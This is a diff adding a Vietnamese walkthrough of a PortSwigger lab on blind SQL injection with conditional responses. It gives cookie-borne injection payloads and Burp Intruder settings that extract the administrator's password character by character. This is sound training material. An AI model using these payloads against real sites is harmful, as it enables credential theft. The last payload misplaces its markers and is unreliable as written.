@@ -499,8 +499,88 @@ Host: 0a1400560347179d818bacde006400a6.web-security-academy.net
 
 Lấy thông tin đăng nhập của `administrator` và đăng nhập.
 
-### 
+### Lab: Blind SQL injection with conditional responses
+> Mục tiêu: đăng nhập với tư cách `administrator`.
 
+Phòng thí nghiệm này chứa lỗ hổng SQL mù. Ứng dụng sử dụng `cookie` để phân tích và thực hiện truy vấn SQL chứa giá trị của `cookie` đã gửi.
+Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Nhưng ứng dụng bao gồm một tin nhắn `Welcome back!` trong trang nếu truy vấn trả về bất kỳ hàng nào.
+
+Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`. Bạn cần khai thác lỗ hổng tiêm SQL mù để tìm hiểu mật khẩu của `administrator`.
+
+Cần chọn `request` có `cookie` gửi đến **Repeater**.
+
+#### Check condition
+Payload:
+```
+abc' OR 1=1--
+```
+
+Request:
+
+```http
+GET / HTTP/2
+Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
+Cookie: TrackingId=abc' OR 1=1--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
+```
+
+Ứng dụng sẽ kiểm tra `TrackingId='abc'` có đúng không, nếu không đúng sẽ kiểm tra điều kiện `1=1` (**luôn đúng**).
+Nếu page có `Welcome back!` là chính xác, có thể thay `1=2` để kiểm tra, sẽ không có `Welcome back!` xuất hiện.
+
+> Ý tưởng: Ta đã biết `password` cần tìm là của `user` có `username` là `administrator`, nên chỉ cần xác định độ dài của `password` rồi tìm `password` từ vị trí đầu đến vị trí cuỗi cùng của nó. Ta sử dụng **Burp Intruder** để tự động quá trình tìm `password`.
+
+#### Check administrator's password length
+Request:
+
+```http
+GET / HTTP/2
+Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
+Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
+```
+
+Điều kiện `TrackingId='abc'` là sai nên truy vấn sau `OR` luôn được thực hiện.
+Với truy vấn dưới đây thì nó luôn luôn đúng, nó sẽ trả về `'a'='a'`
+```sql
+(SELECT 'a' FROM users WHERE username='administrator')='a'
+```
+
+Nên ta có thể thêm toán tử  `AND` để kiểm tra độ dài `password` bằng hàm `LENGTH()`
+
+Sử dụng **Burp Intruder** để tự động tìm độ dài `password`
+
+```http
+GET / HTTP/2
+Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
+Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > $1$ )='a'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
+```
+
+- `Add` ở vị trí số 1
+- **Payload** > **Payload type** > **Numbers**
+- **Number range**: From 1 To 20, Step 1
+- **Settings** > **Grep-Match**: Clear and Add `Welcome back`
+- **Start attack**
+
+Kiểm tra xem vị trí cuối cùng có chữ `Welcome back` thì đó là độ dài của `password`, ở đây tôi tìm được 19.
+
+#### Check administrator's password
+
+Request:
+
+```http
+GET / HTTP/2
+Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
+Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password, $1$, 1) = '' )='$a$'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
+```
+
+Sử dụng hàm `SUBSTRING()` để lấy kí tự tại vị trí cần lấy: `SUBSTRING(password, position, length)`
+
+- Chọn chế độ `attack` tổ hợp giữa vị trí `1` và `a`: `Cluster bomb attack`
+- **Payload** > **Payload position**
+    - **1 - 1**: chọn `type` là `Numbers` từ 1 đến 19
+    - **2 - a**: chọn `type` là `Brute forcer` với `Min length` và `Max Length` là 1
+- Thêm `Grep-Match` như trên
+- **Start attack**
+
+Lấy kết quả, nối chúng lại theo đúng vị trí. Đăng nhập với tư cách `administrator`.
 
 ---
 Goodluck! 🍀🍀🍀
